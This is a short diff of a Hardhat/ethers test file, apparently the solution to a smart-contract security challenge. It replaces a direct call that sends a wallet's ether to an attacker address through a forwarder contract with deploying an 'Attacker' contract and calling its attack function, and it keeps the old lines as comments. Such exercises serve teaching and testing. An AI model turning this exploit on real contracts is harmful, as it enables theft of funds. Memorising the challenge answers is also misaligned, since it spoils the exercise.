@@ -37,10 +37,16 @@ describe(NAME, function () {
     });
 
         it("conduct your attack here", async function () {
-            let ABI = ["function sendEther(address destination, uint256 amount)"];
-            let iface = new ethers.utils.Interface(ABI);
-            let data = iface.encodeFunctionData("sendEther", [attackerWallet.address, value]);
-            forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
+            const attackerContract = await (
+                await ethers.getContractFactory("Attacker")
+            ).deploy(forwarderContract.address, walletContract.address);
+            await attackerContract.connect(attackerWallet).attack();
+
+            // let ABI = ["function sendEther(address destination, uint256 amount)"];
+            // let iface = new ethers.utils.Interface(ABI);
+            // let data = iface.encodeFunctionData("sendEther", [attackerWallet.address, value]);
+
+            // forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
         });
 
     after(async function () {
